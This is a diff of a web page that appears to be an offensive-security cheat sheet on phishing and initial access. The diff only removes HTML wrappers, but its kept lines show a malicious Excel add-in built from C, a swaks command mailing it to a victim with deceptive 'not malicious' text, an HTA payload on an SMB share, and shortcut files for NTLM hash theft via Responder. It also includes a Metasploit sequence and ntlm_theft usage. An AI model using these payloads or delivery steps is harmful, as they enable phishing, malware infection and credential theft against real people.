@@ -13,8 +13,6 @@ tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt",
 {{< tab set1 tab7 >}}others{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 $obj = New-Object -ComObject WScript.Shell
 ```
@@ -31,14 +29,10 @@ $link.TargetPath = "C:\ProgramData\rev.exe"
 $link.Save()
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
 #### shell.c
-
-<div>
 
 ```console
 #include <windows.h>
@@ -67,27 +61,17 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 ```
 
-</div>
-
 #### 1. Compile shell.c in Linux
-
-<div>
 
 ```console
 x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 ```
 
-</div>
-
 #### 2. Send email with the malicious xll file
-
-<div>
 
 ```console
 swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
 ```
-
-</div>
 
 <small>*Ref: [revshells.com](https://www.revshells.com/)*</small>
 
@@ -96,18 +80,12 @@ swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --
 
 #### 1. Start a Local SMB Server
 
-<div>
-
 ```console
 # In our local Linux machine
 impacket-smbserver -smb2support share .
 ```
 
-</div>
-
 #### 2. Create a Malicious hta File in local Linux SMB share
-
-<div>
 
 ```console
 <html>
@@ -124,11 +102,7 @@ impacket-smbserver -smb2support share .
 </html>
 ```
 
-</div>
-
 #### 3. Create a shortcut file in target Windows
-
-<div>
 
 ```console
 # In target Windows machine (powershell)
@@ -147,8 +121,6 @@ $shortcutContent = "[InternetShortcut]`r`nURL=$url"
 Set-Content -Path $shortcutPath -Value $shortcutContent
 ```
 
-</div>
-
 <small>*Ref: [revshells.com](https://www.revshells.com/)*</small>
 
 {{< /tabcontent >}}
@@ -158,18 +130,12 @@ Set-Content -Path $shortcutPath -Value $shortcutContent
 
 #### 1. Start Responder
 
-<div>
-
 ```console
 # In our local Linux machine
 sudo responder -I tun0
 ```
 
-</div>
-
 #### 2. Create a malicious shortcut
-
-<div>
 
 ```console
 [Shell]
@@ -178,11 +144,7 @@ Command=2
 IconFile=\\<LOCAL_IP>\icon
 ```
 
-</div>
-
 #### 3. Upload the malicious shortcut
-
-<div>
 
 ```console
 # In our local Linux machine
@@ -193,12 +155,8 @@ smbclient -N \\\\<TARGET>\\share\\
 mput evil.scf
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab5 >}}
-
-<div>
 
 ```console
 +--------------------------------------------------------+
@@ -208,11 +166,7 @@ mput evil.scf
 +--------------------------------------------------------+
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 Sub OnLoad
@@ -220,11 +174,7 @@ Sub OnLoad
 End Sub
 ```
 
-</div>
-
 <br>
-
-<div>
 
 ```console
 +-----------------------------------------------------------+
@@ -234,12 +184,8 @@ End Sub
 +-----------------------------------------------------------+
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab6 >}}
-
-<div>
 
 ```console
 msfconsole -q
@@ -261,21 +207,13 @@ set lhost <LOCAL_IP>
 exploit
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab7 >}}
-
-<div>
 
 ```console
 python3 ntlm_theft.py -g all -s <LOCAL_IP> -f test
 ```
 
-</div>
-
 <small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>
 
 {{< /tabcontent >}}
-
-<br>
